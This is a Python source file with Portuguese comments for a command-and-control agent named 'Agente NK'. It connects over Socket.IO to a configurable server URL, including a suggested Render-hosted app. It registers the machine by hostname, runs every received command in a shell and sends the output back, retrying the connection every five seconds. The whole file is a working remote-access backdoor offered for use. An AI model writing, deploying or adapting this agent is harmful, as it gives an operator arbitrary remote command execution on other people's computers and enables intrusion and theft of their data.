import socketio
import subprocess
import os
import platform
import time

# --- CONFIGURAÇÃO ---
# Se rodar localmente: 'http://localhost:3000'
# Se rodar no Render: 'https://seu-app.onrender.com'
SERVER_URL = 'http://localhost:3000' 

sio = socketio.Client()
hostname = platform.node()

@sio.event
def connect():
    print(f"[*] Conectado ao C2 como {hostname}")
    sio.emit('identify', {'type': 'agent', 'id': hostname})

@sio.event
def exec(data):
    cmd = data.get('cmd')
    print(f"[*] Comando recebido: {cmd}")
    try:
        # Executa comando no shell
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        res = output.decode('utf-8', errors='ignore')
    except Exception as e:
        res = f"Erro: {str(e)}"
    
    # Envia resultado de volta
    sio.emit('result', {'output': f"[{hostname}]\n{res}"})

@sio.event
def disconnect():
    print("[!] Desconectado")

if __name__ == '__main__':
    print(f"[*] Agente NK Iniciado.")
    print(f"[*] Tentando conectar a {SERVER_URL}...")
    
    while True:
        try:
            sio.connect(SERVER_URL)
            sio.wait()
        except Exception as e:
            print(f"[!] Erro de conexão: {e}. Retentando em 5s...")
            time.sleep(5)
